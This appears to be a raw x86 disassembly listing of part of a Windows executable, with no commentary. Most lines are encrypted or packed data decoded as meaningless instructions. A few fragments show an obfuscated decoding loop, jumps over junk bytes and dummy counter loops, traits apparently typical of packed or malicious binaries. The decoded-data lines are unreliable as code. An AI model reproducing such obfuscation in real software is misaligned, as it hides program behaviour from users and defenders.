  4029a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029a2:	repnz lahf 
  4029a4:	inc    ebp
  4029a5:	jo     0x402992
  4029a7:	cs es (bad) 
  4029aa:	sti    
  4029ab:	cwde   
  4029ac:	or     esp,ecx
  4029ae:	inc    ecx
  4029af:	repnz push ss
  4029b1:	(bad)  
  4029b2:	adc    ah,bh
  4029b4:	jg     0x4029f0
  4029b6:	ins    BYTE PTR es:[edi],dx
  4029b7:	addr16 mov gs,esi
  4029ba:	or     eax,0xe6654e5e
  4029bf:	test   eax,eax
  4029c1:	in     eax,0xf6
  4029c3:	and    BYTE PTR ds:0x2800cf60,cl
  4029c9:	mov    ebp,0xe2524ac4
  4029ce:	in     al,dx
  4029cf:	xchg   edx,eax
  4029d0:	outs   dx,BYTE PTR ds:[esi]
  4029d1:	idiv   DWORD PTR [edx-0x67]
  4029d4:	xchg   BYTE PTR [ecx+esi*2-0xe],bh
  4029d8:	jge    0x40296b
  4029da:	sbb    ebx,ebp
  4029dc:	imul   esp,DWORD PTR [edi+0x2e],0xffffffaf
  4029e0:	or     DWORD PTR [edi-0x72],esi
  4029e3:	adc    eax,DWORD PTR ds:0xebac5396
  4029e9:	mov    bl,0x3f
  4029eb:	lea    ebx,[edi-0x32]
  4029ee:	ja     0x402a68
  4029f0:	div    DWORD PTR [ebx+0x55]
  4029f3:	dec    ebx
  4029f4:	cmp    dl,bh
  4029f6:	sar    DWORD PTR [ebp+0x2a],0x32
  4029fa:	or     DWORD PTR [ebp+esi*8-0x795220b],ebp
  402a01:	and    BYTE PTR [ebp+0x72fb68d0],0x2f
  402a08:	pop    es
  402a09:	shl    BYTE PTR [ebp-0x7d],0x7e
  402a0d:	mov    DWORD PTR [ebx],eax
  402a0f:	jge    0x402a21
  402a11:	xor    edx,ecx
  402a13:	add    edx,esi
  402a15:	cmp    edx,edi
  402a17:	ja     0x402e5d
  402a1d:	push   ebx
  402a1e:	jmp    0x402a28
  402a23:	mov    esi,0x32729b
  402a28:	mov    eax,DWORD PTR [ebp-0x8]
  402a2b:	mov    edi,DWORD PTR [ebp-0x4]
  402a2e:	jmp    0x402c26
  402a33:	lock ss inc eax
  402a36:	xor    al,0x40
  402a38:	jo     0x402aaa
  402a3a:	repnz push ss
  402a3c:	pop    ds
  402a3d:	mov    ds:0x7da8b080,al
  402a42:	fisubr WORD PTR [eax+0xc]
  402a45:	jle    0x402ac5
  402a47:	push   ebp
  402a48:	jg     0x402ac8
  402a4a:	jle    0x402aba
  402a4c:	mov    ebx,DWORD PTR [esi]
  402a4e:	adc    BYTE PTR [esi-0x7f238f66],0xe2
  402a55:	jbe    0x402a44
  402a57:	imul   ebx,DWORD PTR [ebp-0x26b0632c],0xd772b39d
  402a61:	das    
  402a62:	js     0x4029ff
  402a64:	pop    edx
  402a65:	cwde   
  402a66:	push   ebx
  402a67:	lods   al,BYTE PTR ds:[esi]
  402a68:	push   ebx
  402a69:	adc    eax,ecx
  402a6b:	(bad)  
  402a6c:	mov    ecx,0x17c1d81f
  402a71:	cwde   
  402a72:	mov    ebx,0xe6151221
  402a77:	dec    ebp
  402a78:	dec    ebp
  402a79:	dec    DWORD PTR [esi]
  402a7b:	sub    DWORD PTR [ebp-0x4e],0x6c
  402a7f:	xchg   BYTE PTR [edi],ch
  402a81:	sahf   
  402a82:	inc    ebp
  402a83:	fs enter 0xcef1,0x3
  402a88:	pop    ds
  402a89:	jb     0x402a97
  402a8b:	xor    BYTE PTR [edi-0x7fb0dcc1],ch
  402a91:	out    0x65,al
  402a93:	std    
  402a94:	inc    edi
  402a95:	loop   0x402a67
  402a97:	ds push ecx
  402a99:	lahf   
  402a9a:	inc    ecx
  402a9b:	mov    ds:0x93f47a77,eax
  402aa0:	mov    ds:0xf483f9e6,eax
  402aa5:	jge    0x402a56
  402aa7:	dec    esi
  402aa8:	mov    edx,0x1fd59173
  402aad:	lahf   
  402aae:	mov    ah,0x6f
  402ab0:	mov    ebx,0x9e9cc982
  402ab5:	jecxz  0x402a3e
  402ab7:	dec    ebx
  402ab8:	sub    bh,BYTE PTR [ecx]
  402aba:	pop    ss
  402abb:	jns    0x402a8e
  402abd:	pop    esp
  402abe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402abf:	xchg   DWORD PTR [ebx],edi
  402ac1:	add    BYTE PTR [esi],ah
  402ac3:	scas   al,BYTE PTR es:[edi]
  402ac4:	xchg   BYTE PTR [eax],bl
  402ac6:	pop    ecx
  402ac7:	and    ch,BYTE PTR [ebp+ebx*1-0x71]
  402acb:	inc    edx
  402acc:	inc    edi
  402acd:	jns    0x402afe
  402acf:	push   esp
  402ad0:	cld    
  402ad1:	fnstcw WORD PTR [esi+0x5e]
  402ad4:	cwde   
  402ad5:	data16 xor BYTE PTR [ecx-0x6],bh
  402ad9:	jmp    0xbe4a:0x59bc3545
  402ae0:	xor    DWORD PTR [edx-0x2ba7b2cc],edx
  402ae6:	lea    ebp,[eax]
  402ae8:	icebp  
  402ae9:	pop    edx
  402aea:	inc    eax
  402aeb:	adc    al,0x8e
  402aed:	fldcw  WORD PTR [edx-0x8]
  402af0:	push   edi
  402af1:	daa    
  402af2:	xor    BYTE PTR [ebp+eiz*1+0x37],0x61
  402af7:	sub    eax,0xc3be08eb
  402afc:	fsub   st(6),st
  402afe:	or     dl,BYTE PTR [edx-0x4440554b]
  402b04:	xor    BYTE PTR [edi],al
  402b06:	das    
  402b07:	mov    eax,0xd2c8e62b
  402b0c:	popf   
  402b0d:	jl     0x402adf
  402b0f:	pop    ecx
  402b10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b11:	pop    ds
  402b12:	sbb    al,BYTE PTR [ebx+0x5c]
  402b15:	push   edi
  402b16:	xlat   BYTE PTR ds:[ebx]
  402b17:	mov    al,0x8b
  402b19:	(bad)  
  402b1a:	addr16 xchg esi,eax
  402b1c:	int    0x39
  402b1e:	in     al,dx
  402b1f:	cmc    
  402b20:	cs int 0xcf
  402b23:	add    eax,0x8fe8f8c1
  402b28:	cmp    al,0x9c
  402b2a:	pop    ecx
  402b2b:	(bad)  [ecx]
  402b2d:	inc    esp
  402b2e:	imul   esp,DWORD PTR ds:0x29ed0a6e,0xaf73085
  402b38:	popf   
  402b39:	push   esi
  402b3a:	(bad)  [edx+ebx*8-0x67]
  402b3e:	push   0x39
  402b40:	xchg   BYTE PTR [ecx+ecx*8+0x4c],dl
  402b44:	scas   eax,DWORD PTR es:[edi]
  402b45:	jecxz  0x402b79
  402b47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b48:	aam    0xf0
  402b4a:	jnp    0x402baf
  402b4c:	fcom   DWORD PTR [edi-0x2fd31ccc]
  402b52:	add    BYTE PTR [eax+0x602f094e],al
  402b58:	retf   0x5cd4
  402b5b:	inc    eax
  402b5c:	fdiv   DWORD PTR [eax+ebp*4]
  402b5f:	and    DWORD PTR [esi],edi
  402b61:	jbe    0x402b50
  402b63:	jbe    0x402bb8
  402b65:	add    bh,0xbb
  402b68:	(bad)  
  402b69:	shl    DWORD PTR [edx+ebx*1],1
  402b6c:	cli    
  402b6d:	outs   dx,DWORD PTR ds:[esi]
  402b6e:	icebp  
  402b6f:	sub    eax,0xfe9ec5d0
  402b74:	add    edi,ebx
  402b76:	rcr    eax,1
  402b78:	adc    al,0xa1
  402b7a:	jecxz  0x402b9b
  402b7c:	data16 loope 0x402b13
  402b7f:	add    al,0x47
  402b81:	shr    al,1
  402b83:	ins    DWORD PTR es:[edi],dx
  402b84:	push   cs
  402b85:	popf   
  402b86:	outs   dx,DWORD PTR ds:[esi]
  402b87:	xchg   esp,eax
  402b88:	call   0xd6598960
  402b8d:	xlat   BYTE PTR ds:[ebx]
  402b8e:	mov    ecx,0x1c65906c
  402b93:	frstor [esp+eax*8]
  402b96:	enter  0xfc36,0x1c
  402b9a:	mov    ds:0x76f1d2c7,al
  402b9f:	xor    DWORD PTR es:[esi],esi
  402ba2:	mov    dh,0x14
  402ba4:	mov    BYTE PTR [ebx+0x58],ah
  402ba7:	shl    DWORD PTR [edi-0x5d74dfa],cl
  402bad:	inc    ebx
  402bae:	xor    edx,DWORD PTR [ebx+ebx*8]
  402bb1:	jne    0x402b37
  402bb3:	stos   BYTE PTR es:[edi],al
  402bb4:	call   0x4cbcbbf7
  402bb9:	adc    eax,0x6c99dec8
  402bbe:	dec    edi
  402bbf:	inc    esi
  402bc0:	adc    DWORD PTR [eax+0x36e4cd15],ebx
  402bc6:	inc    ebp
  402bc7:	mov    edx,0xb1a92ae5
  402bcc:	sahf   
  402bcd:	inc    esi
  402bce:	add    eax,0xf7431d5
  402bd3:	into   
  402bd4:	lds    edx,FWORD PTR [esi+0x71b72f32]
  402bda:	jne    0x402c22
  402bdc:	rcr    DWORD PTR [edx+edx*1],0x2c
  402be0:	lods   al,BYTE PTR ds:[esi]
  402be1:	cdq    
  402be2:	repz xchg ah,cl
  402be5:	jge    0x402bcd
  402be7:	mov    bl,0x3f
  402be9:	inc    edx
  402bea:	cli    
  402beb:	jle    0x402b70
  402bed:	mov    ebx,edx
  402bef:	mov    ebp,DWORD PTR [edx]
  402bf1:	mov    ah,0x64
  402bf3:	mov    ebp,0x851d3599
  402bf8:	std    
  402bf9:	inc    ecx
  402bfa:	lods   al,BYTE PTR ds:[esi]
  402bfb:	pushf  
  402bfc:	lock xor eax,0x426867d7
  402c02:	or     edi,esp
  402c04:	or     esp,DWORD PTR ds:0x90d2b2c3
  402c0a:	push   edx
  402c0b:	(bad)  
  402c0c:	dec    edi
  402c0d:	cld    
  402c0e:	(bad)  
  402c0f:	pop    edx
  402c10:	xor    esi,esp
  402c12:	enter  0x384,0x3
  402c16:	push   ecx
  402c17:	idiv   DWORD PTR [ebp+0x5e]
  402c1a:	(bad)  
  402c1b:	jle    0x402bf8
  402c1d:	iret   
  402c1e:	leave  
  402c1f:	xor    DWORD PTR [esi-0x22],ebx
  402c22:	and    al,0xdb
  402c24:	jecxz  0x402c75
  402c26:	xor    edi,ecx
  402c28:	add    edi,esi
  402c2a:	mov    esi,DWORD PTR [ebp+0x8]
  402c2d:	imul   edi,edx
  402c30:	mov    ebx,DWORD PTR [ebp+0xc]
  402c33:	xor    eax,ecx
  402c35:	add    eax,edx
  402c37:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  402c3e:	mov    BYTE PTR [edi+esi*1],al
  402c41:	mov    eax,DWORD PTR [ebp-0x4]
  402c44:	xor    eax,ecx
  402c46:	lea    edx,[edx+eax*1+0x32729b]
  402c4d:	mov    eax,DWORD PTR [ebp-0x4]
  402c50:	xor    eax,ecx
  402c52:	mov    esi,0xffcd8d65
  402c57:	sub    esi,eax
  402c59:	jmp    0x402e51
  402c5e:	outs   dx,BYTE PTR ds:[esi]
  402c5f:	add    ebx,DWORD PTR [edi+0x6f72734e]
  402c65:	and    ebp,DWORD PTR [esi]
  402c67:	add    al,0x68
  402c69:	mov    dh,0x45
  402c6b:	dec    esp
  402c6c:	call   0x7e4a7c42
  402c71:	jle    0x402cc8
  402c73:	jg     0x402cf3
  402c75:	jle    0x402c00
  402c77:	js     0x402c94
  402c79:	xchg   ebx,eax
  402c7a:	test   eax,0xa85cc71
  402c7f:	scas   al,BYTE PTR es:[edi]
  402c80:	bound  ebp,QWORD PTR [ecx+ebx*1]
  402c83:	push   ds
  402c84:	repz pop ds
  402c86:	jb     0x402c37
  402c88:	xchg   esp,eax
  402c89:	mov    al,0xd0
  402c8b:	scas   eax,DWORD PTR es:[edi]
  402c8c:	(bad)  
  402c8d:	push   edi
  402c8e:	enter  0xd8f,0x19
  402c92:	sub    ah,BYTE PTR ds:[ebp+0x476352b9]
  402c99:	daa    
  402c9a:	jmp    0x9544a103
  402c9f:	(bad)  
  402ca0:	rol    BYTE PTR [ebp+0x4c],cl
  402ca3:	mov    edx,ds
  402ca5:	ja     0x402c46
  402ca7:	mov    edi,0xc1b31222
  402cac:	jecxz  0x402c7c
  402cae:	jl     0x402cba
  402cb0:	push   esp
  402cb1:	mov    cl,0xea
  402cb3:	inc    ebp
  402cb4:	mov    eax,0xc9469d44
  402cb9:	clc    
  402cba:	adc    ecx,DWORD PTR [edx+ecx*8-0x56]
  402cbe:	out    0x4f,al
  402cc0:	test   esp,0x2c2ad519
  402cc6:	jne    0x402d28
  402cc8:	mov    ah,0xe6
  402cca:	mov    ds:0x493f46b2,eax
  402ccf:	mov    ebx,DWORD PTR [edi+0x73dc90be]
  402cd5:	xchg   esi,eax
  402cd6:	clc    
  402cd7:	pop    ds
  402cd8:	ret    0xa1ae
  402cdb:	cli    
  402cdc:	mov    edx,0x38215359
  402ce1:	and    DWORD PTR [edi-0x27492146],0xcaf6b25b
  402ceb:	mov    esp,0xb4095018
  402cf0:	in     eax,0x9e
  402cf2:	enter  0x385,0xa1
  402cf6:	(bad)  
  402cf7:	dec    ebp
  402cf8:	xor    esi,DWORD PTR [ecx-0x4ca09607]
  402cfe:	das    
  402cff:	dec    esi
  402d00:	test   DWORD PTR [esi+0x6415d4e0],eax
  402d06:	rol    edi,0x72
  402d09:	js     0x402d66
  402d0b:	ja     0x402d30
  402d0d:	jle    0x402d8a
  402d0f:	jge    0x402d25
  402d11:	std    
  402d12:	xor    BYTE PTR [edx],0xc7
  402d15:	sahf   
  402d16:	dec    edi
  402d17:	shl    DWORD PTR [ebp-0x7fcba089],1
  402d1d:	mov    ds:0x3728d11f,eax
  402d22:	mov    ecx,0x8438849b
  402d27:	in     al,0x6d
  402d29:	pop    es
  402d2a:	sbb    BYTE PTR [ecx+esi*4],ch
  402d2d:	xchg   edi,eax
  402d2e:	hlt    
  402d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d30:	dec    eax
  402d31:	adc    DWORD PTR [edi],edx
  402d33:	out    dx,eax
  402d34:	jmp    0x52d73cf3
  402d39:	jae    0x402d5a
  402d3b:	mov    edi,0x67d4936b
  402d40:	push   esp
  402d41:	(bad)  
  402d42:	lods   al,BYTE PTR ds:[esi]
  402d43:	fchs   
  402d45:	mov    eax,0xaf950ee7
  402d4a:	lods   al,BYTE PTR ds:[esi]
  402d4b:	std    
  402d4c:	xchg   ebp,eax
  402d4d:	icebp  
  402d4e:	pop    es
  402d4f:	and    eax,0x85e8f237
  402d54:	stc    
  402d55:	ins    BYTE PTR es:[edi],dx
  402d56:	or     DWORD PTR [edx-0x461dcaaa],0x47a51034
  402d60:	ss pop ecx
  402d62:	into   
  402d63:	je     0x402da3
  402d65:	jmp    0x402d97
  402d67:	and    BYTE PTR [ebx],bh
  402d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d6a:	mov    al,ds:0x144cb6a1
  402d6f:	add    dl,BYTE PTR [edx]
  402d71:	in     eax,dx
  402d72:	cmp    BYTE PTR [ebp-0x2a7c7f60],dl
  402d78:	cmp    DWORD PTR [edx-0x7bbd859e],ebx
  402d7e:	jbe    0x402d08
  402d80:	pusha  
  402d81:	cmp    DWORD PTR [esi+esi*4-0x7],esi
  402d85:	xor    eax,0xbab22908
  402d8a:	push   ss
  402d8b:	loopne 0x402d32
  402d8d:	adc    ch,0xb1
  402d90:	adc    dh,BYTE PTR [ebx-0x368d677a]
  402d96:	es mov dh,dl
  402d99:	jmp    0x2365:0xdee4a8f3
  402da0:	dec    eax
  402da1:	add    ch,BYTE PTR [ebx]
  402da3:	xchg   edx,eax
  402da4:	sbb    bh,BYTE PTR [ebx-0x57929740]
  402daa:	mov    es,ebx
  402dac:	cld    
  402dad:	sahf   
  402dae:	lea    ebx,[edi+0x2625ad47]
  402db4:	hlt    
  402db5:	fdiv   QWORD PTR [edi]
  402db7:	dec    eax
  402db8:	mov    DWORD PTR [edi-0x1ba10298],esi
  402dbe:	int    0xe0
  402dc0:	loopne 0x402d76
  402dc2:	and    al,0x53
  402dc4:	push   esp
  402dc5:	xchg   esi,eax
  402dc6:	retf   
  402dc7:	pop    ebp
  402dc8:	std    
  402dc9:	cmp    cl,BYTE PTR [ecx+ebp*8]
  402dcc:	in     al,0x92
  402dce:	fcomp  st(6)
  402dd0:	fs xor esp,esi
  402dd3:	nop
  402dd4:	xor    WORD PTR [ebp-0x76],0xff9e
  402dd9:	lahf   
  402dda:	push   ebp
  402ddb:	sbb    cl,cl
  402ddd:	mov    esi,0x48ad83a8
  402de2:	sub    ecx,edx
  402de4:	js     0x402d85
  402de6:	adc    al,0x79
  402de8:	aam    0x35
  402dea:	or     al,0x50
  402dec:	mov    al,cl
  402dee:	fincstp 
  402df0:	call   0x644d232a
  402df5:	(bad)  
  402df6:	mov    ds:0xb63eef40,eax
  402dfb:	adc    bl,bh
  402dfd:	push   0xfffffff9
  402dff:	mov    ecx,0x7cce909c
  402e04:	pop    eax
  402e05:	sub    DWORD PTR [edi-0x43],esi
  402e08:	push   ds
  402e09:	mov    BYTE PTR [edx+eax*8],al
  402e0c:	pop    ecx
  402e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e0e:	and    dh,dh
  402e10:	adc    edx,DWORD PTR [ecx-0x44e281a2]
  402e16:	stc    
  402e17:	sbb    dl,cl
  402e19:	and    al,0x8e
  402e1b:	ret    
  402e1c:	or     esi,ecx
  402e1e:	ins    BYTE PTR es:[edi],dx
  402e1f:	add    esi,DWORD PTR [ecx+0x14193e2]
  402e25:	jp     0x402e23
  402e27:	jmp    0x5494:0x48533d40
  402e2e:	mov    bl,0x8b
  402e30:	inc    edi
  402e31:	mov    cl,0xd8
  402e33:	sbb    eax,0x304ca58f
  402e38:	push   0x31
  402e3a:	jmp    0xe4f48c28
  402e3f:	xchg   BYTE PTR [eax-0x44ad5825],ch
  402e45:	jno    0x402e53
  402e47:	mov    al,ds:0xe5f93ae0
  402e4c:	cmp    eax,0xd2bd076f
  402e51:	add    esi,DWORD PTR [ebp+0x10]
  402e54:	cmp    edx,esi
  402e56:	jbe    0x402a23
  402e5c:	pop    ebx
  402e5d:	mov    eax,0xf89c8532
  402e62:	pop    edi
  402e63:	pop    esi
  402e64:	leave  
  402e65:	ret    0xc
  402e68:	push   ebp
  402e69:	mov    ebp,esp
  402e6b:	sub    esp,0x58
  402e6e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e71:	mov    eax,0x8a3c
  402e76:	xor    ax,WORD PTR [ecx+0x20]
  402e7a:	mov    ecx,0x3b02
  402e7f:	add    ax,cx
  402e82:	or     DWORD PTR ds:0x42e7d0,edi
  402e88:	movzx  eax,ax
  402e8b:	mov    ecx,DWORD PTR ds:0x430435
  402e91:	xor    ecx,DWORD PTR ds:0x42edd3
  402e97:	mov    DWORD PTR ds:0x430435,ecx
  402e9d:	mov    DWORD PTR [ebp-0xc],eax
  402ea0:	mov    BYTE PTR [ebp-0x1],0x7f
  402ea4:	sub    ecx,0x18d2
  402eaa:	lea    eax,[ebp-0x1]
  402ead:	and    DWORD PTR ds:0x42edef,0x0
  402eb7:	jmp    0x402ec9
  402ebc:	mov    ecx,DWORD PTR ds:0x42edef
  402ec2:	inc    ecx
  402ec3:	mov    DWORD PTR ds:0x42edef,ecx
  402ec9:	cmp    DWORD PTR ds:0x42edef,0x18
  402ed0:	jae    0x402fa2
  402ed6:	cmp    DWORD PTR ds:0x42edef,0x1a
  402edd:	jne    0x402eee
  402ee3:	push   0x2d42
  402ee8:	call   DWORD PTR ds:0x42ea9b
  402eee:	jmp    0x402ebc
  402ef3:	mov    DWORD PTR ds:0x42ede7,0x17
  402efd:	cmp    DWORD PTR ds:0x42ede7,0x0
  402f04:	je     0x402fa2
  402f0a:	cmp    DWORD PTR ds:0x42ede7,0x7
  402f11:	jne    0x402f2c
  402f17:	push   0x25f8
  402f1c:	push   0x430449
  402f21:	push   0x42e8b7
  402f26:	call   DWORD PTR ds:0x42e9b3
  402f2c:	cmp    DWORD PTR ds:0x42ede7,0x8
  402f33:	jne    0x402f48
  402f39:	xor    ecx,ecx
  402f3b:	or     ecx,DWORD PTR ds:0x42ede7
  402f41:	dec    ecx
  402f42:	mov    DWORD PTR ds:0x42ede7,ecx
  402f48:	mov    ecx,DWORD PTR ds:0x42ede7
  402f4e:	dec    ecx
  402f4f:	mov    DWORD PTR ds:0x42ede7,ecx
  402f55:	jmp    0x402efd
  402f5a:	and    DWORD PTR ds:0x42edcf,0x0
  402f64:	mov    ecx,DWORD PTR ds:0x42edcf
  402f6a:	inc    ecx
  402f6b:	mov    DWORD PTR ds:0x42edcf,ecx
  402f71:	cmp    DWORD PTR ds:0x42edcf,0x16
  402f78:	jne    0x402f8f
  402f7e:	push   DWORD PTR [ebp-0xc]
  402f81:	push   0x43046d
  402f86:	push   DWORD PTR [ebp-0x24]
  402f89:	call   DWORD PTR ds:0x42e9c7
  402f8f:	cmp    DWORD PTR ds:0x42edcf,0x10
  402f96:	jb     0x402f64
  402f9c:	add    DWORD PTR ds:0x42edcb,ebx
  402fa2:	mov    DWORD PTR [ebp-0x10],eax
  402fa5:	mov    DWORD PTR ds:0x430455,0x10
  402faf:	cmp    DWORD PTR ds:0x430455,0x0
  402fb6:	je     0x403010
  402fbc:	cmp    DWORD PTR ds:0x430455,0x4
  402fc3:	jne    0x402fda
  402fc9:	push   DWORD PTR [ebp-0x1c]
  402fcc:	push   DWORD PTR [ebp-0x20]
  402fcf:	push   0x42e82d
  402fd4:	call   DWORD PTR ds:0x42e9cb
  402fda:	cmp    DWORD PTR ds:0x430455,0x5
  402fe1:	jne    0x402ff4
  402fe7:	mov    ecx,DWORD PTR ds:0x430455
  402fed:	dec    ecx
  402fee:	mov    DWORD PTR ds:0x430455,ecx
  402ff4:	mov    ecx,DWORD PTR ds:0x430455
  402ffa:	dec    ecx
  402ffb:	mov    DWORD PTR ds:0x430455,ecx
  403001:	jmp    0x402faf
  403006:	and    DWORD PTR ds:0x43046d,0x3a0f
  403010:	mov    al,BYTE PTR [ebp-0x1]
  403013:	mov    ecx,DWORD PTR ds:0x42e7c0
  403019:	add    DWORD PTR ds:0x42edf3,ecx
  40301f:	mov    ecx,DWORD PTR [ebp-0x10]
  403022:	mov    DWORD PTR ds:0x4304db,0x1b71
  40302c:	xor    al,0x46
  40302e:	sub    al,0x38
  403030:	or     DWORD PTR ds:0x42e7c8,0x7677
  40303a:	mov    BYTE PTR [ecx],al
  40303c:	not    eax
  40303e:	jmp    0x40320b
  403043:	loop   0x40305e
  403045:	fcom   DWORD PTR [ebp+0x697355e1]
  40304b:	popf   
  40304c:	mov    DWORD PTR [ecx-0x48],ebp
  40304f:	xchg   ebp,eax
  403050:	xchg   edi,eax
  403051:	push   edi
  403052:	mov    fs,WORD PTR [edx-0x518181f8]
  403058:	jg     0x4030d8
  40305a:	jle    0x403084
  40305c:	pop    esi
  40305d:	ret    
  40305e:	xor    al,0x99
  403060:	test   al,0xfe
  403062:	dec    edi
  403063:	cdq    
  403064:	test   BYTE PTR [edi+0x5a],al
  403067:	repnz inc edi
  403069:	dec    esp
  40306a:	jge    0x4030c4
  40306c:	jmp    0xa1553ef2
  403071:	and    BYTE PTR [eax+0x32],ch
  403074:	mov    al,ds:0x3fdfb115
  403079:	jecxz  0x4030d4
  40307b:	test   eax,0x9058cbca
  403080:	pusha  
  403081:	enter  0x105c,0x98
  403085:	dec    edi
  403086:	mov    dl,0xab
  403088:	test   DWORD PTR [edi+0x6],edx
  40308b:	xchg   edi,eax
  40308c:	sti    
  40308d:	cwde   
  40308e:	sbb    BYTE PTR [ebx-0x4f],bh
  403091:	sub    BYTE PTR [ebx+0x5edd937],ah
  403097:	push   esp
  403098:	push   ebx
  403099:	out    0x46,eax
  40309b:	or     BYTE PTR [edx+0x540f0e4e],0x7a
  4030a2:	(bad)  
  4030a3:	retf   0xc18e
  4030a6:	dec    ebx
  4030a7:	std    
  4030a8:	scas   al,BYTE PTR es:[edi]
  4030a9:	in     eax,0x7e
  4030ab:	popa   
  4030ac:	mov    ds:0xbf3fa5d3,al
  4030b1:	in     al,0x36
  4030b3:	sbb    eax,0x6a36fc3c
  4030b8:	xor    DWORD PTR [esp+eax*4],ebp
  4030bb:	int3   
  4030bc:	inc    ebp
  4030bd:	fdiv   st,st(6)
  4030bf:	mov    bl,0x64
  4030c1:	cmp    edi,DWORD PTR [esi+0x4fe25cf6]
  4030c7:	xchg   BYTE PTR [ecx+eiz*1+0x7d87d62d],bl
  4030ce:	sar    dh,cl
  4030d0:	in     eax,dx
  4030d1:	push   0x146fb90d
  4030d6:	out    dx,al
  4030d7:	push   eax
  4030d8:	test   eax,0xb0909a75
  4030dd:	retf   0x575e
  4030e0:	xchg   esi,eax
  4030e1:	jmp    0x403086
  4030e3:	push   eax
  4030e4:	scas   al,BYTE PTR es:[edi]
  4030e5:	mov    dl,0xd4
  4030e7:	hlt    
  4030e8:	push   ss
  4030e9:	jle    0x403094
  4030eb:	mov    bl,0x8f
  4030ed:	cmp    DWORD PTR [ebp+eax*4-0x2c],ebx
  4030f1:	loop   0x4030b3
  4030f3:	jb     0x4030bc
  4030f5:	dec    edx
  4030f6:	mov    dl,0x14
  4030f8:	cs enter 0x3bef,0xc0
  4030fd:	push   0xa107f6ea
  403102:	and    al,ch
  403104:	cmp    al,0x89
  403106:	mov    esi,0x53364c9d
  40310b:	in     eax,dx
  40310c:	mov    dh,BYTE PTR [edx+0x34d7a904]
  403112:	inc    ebp
  403113:	jle    0x4030bb
  403115:	in     eax,0x53
  403117:	outs   dx,DWORD PTR ds:[esi]
  403118:	adc    DWORD PTR [eax-0x67b83ee4],0x32c1b554
  403122:	call   DWORD PTR ds:0xeec7339e
  403128:	jle    0x40319c
  40312a:	mov    ds:0x87a2e654,eax
  40312f:	shr    BYTE PTR [ebp+0x345fc4f4],1
  403135:	lahf   
  403136:	mov    DWORD PTR [edx+0x7c],edx
  403139:	ins    DWORD PTR es:[edi],dx
  40313a:	cmc    
  40313b:	and    bh,BYTE PTR [eax-0x749d5a0f]
  403141:	data16 daa 
  403143:	fsub   DWORD PTR [ebx-0x6280ada6]
  403149:	retf   
  40314a:	ret    
  40314b:	mov    al,0x12
  40314d:	gs push edi
  40314f:	mov    ah,0x3a
  403151:	dec    ebx
  403152:	popf   
  403153:	es adc eax,0xe02e8038
  403159:	xchg   ebx,eax
  40315a:	jae    0x40318b
  40315c:	fidivr WORD PTR [eax+edi*8-0x3d]
  403160:	jle    0x4031a6
  403162:	rep ins DWORD PTR es:[edi],dx
  403164:	mov    al,0xc1
  403166:	push   es
  403167:	loope  0x403185
  403169:	pop    ebx
  40316a:	int3   
  40316b:	loope  0x403178
  40316d:	pop    es
  40316e:	fnsave [ebx]
  403170:	push   0x67452bf8
  403175:	xor    ebx,0xfffffffe
  403178:	and    al,0x50
  40317a:	cli    
  40317b:	arpl   WORD PTR [esi-0x53],bx
  40317e:	or     dh,BYTE PTR [edx]
  403180:	retf   
  403181:	aad    0x65
  403183:	pop    ds
  403184:	in     al,0xcc
  403186:	das    
  403187:	shr    DWORD PTR [edi+edi*8],0x60
  40318b:	push   ds
  40318c:	std    
  40318d:	cs out dx,eax
  40318f:	gs xor al,0xe1
  403192:	push   edi
  403193:	xchg   bl,cl
  403195:	and    dh,BYTE PTR [edx-0x387b8f2c]
  40319b:	in     al,0xec
  40319d:	fcom   DWORD PTR [ebp+0x71]
  4031a0:	xchg   edi,eax
  4031a1:	inc    ebx
  4031a2:	jnp    0x40312e
  4031a4:	icebp  
  4031a5:	aas    
  4031a6:	jne    0x4031ea
  4031a8:	mov    ecx,0x995eac2a
  4031ad:	xor    esp,DWORD PTR [edx+ebx*2]
  4031b0:	mov    ch,bl
  4031b2:	xor    bl,BYTE PTR [eax-0x74859816]
  4031b8:	sbb    DWORD PTR [esp+eax*4+0x38],ebx
  4031bc:	out    dx,eax
  4031bd:	cwde   
  4031be:	add    eax,0x4e856644
  4031c3:	jge    0x4031a4
  4031c5:	loop   0x403241
  4031c7:	outs   dx,DWORD PTR ds:[esi]
  4031c8:	sub    BYTE PTR [esi+0x5d],bl
  4031cb:	add    BYTE PTR [ecx],al
  4031cd:	xchg   edi,eax
  4031ce:	or     ch,BYTE PTR [esi+esi*2]
  4031d1:	(bad)  
  4031d2:	das    
  4031d3:	add    eax,0x383c7f0c
  4031d8:	stos   BYTE PTR es:[edi],al
  4031d9:	stos   BYTE PTR es:[edi],al
  4031da:	sub    dh,bl
  4031dc:	mov    ds:0x7837b7bf,al
  4031e1:	sub    eax,0xf6d482d6
  4031e6:	mov    eax,0x439d185b
  4031eb:	and    dh,BYTE PTR [esi+esi*8]
  4031ee:	rcl    DWORD PTR [ebx],0x4b
  4031f1:	mov    eax,0xb107a4ea
  4031f6:	stos   BYTE PTR es:[edi],al
  4031f7:	mov    WORD PTR [esi-0x63],fs
  4031fa:	jmp    0x3c7a:0xb883e4b4
  403201:	xlat   BYTE PTR ds:[ebx]
  403202:	jmp    0x7a7e:0xc960b72b
  403209:	sbb    bl,ch
  40320b:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403212:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  403219:	or     DWORD PTR ds:0x42edef,ecx
  40321f:	mov    eax,DWORD PTR [ebp-0x8]
  403222:	movzx  ecx,WORD PTR ds:0x42edcb
  403229:	adc    DWORD PTR ds:0x4304d7,ecx
  40322f:	mov    ecx,0x7510854
  403234:	sub    DWORD PTR ds:0x42e7c8,0x77ef
  40323e:	push   esi
  40323f:	xor    eax,ecx
  403241:	and    DWORD PTR ds:0x430461,0x33b1
  40324b:	jmp    0x403418
  403250:	inc    ecx
  403251:	jp     0x4031f4
  403253:	cs popa 
  403255:	mov    ch,0x51
  403257:	jno    0x403251
  403259:	(bad)  
  40325b:	pop    edi
  40325c:	popf   
  40325d:	out    0xf4,al
  40325f:	and    edx,edx
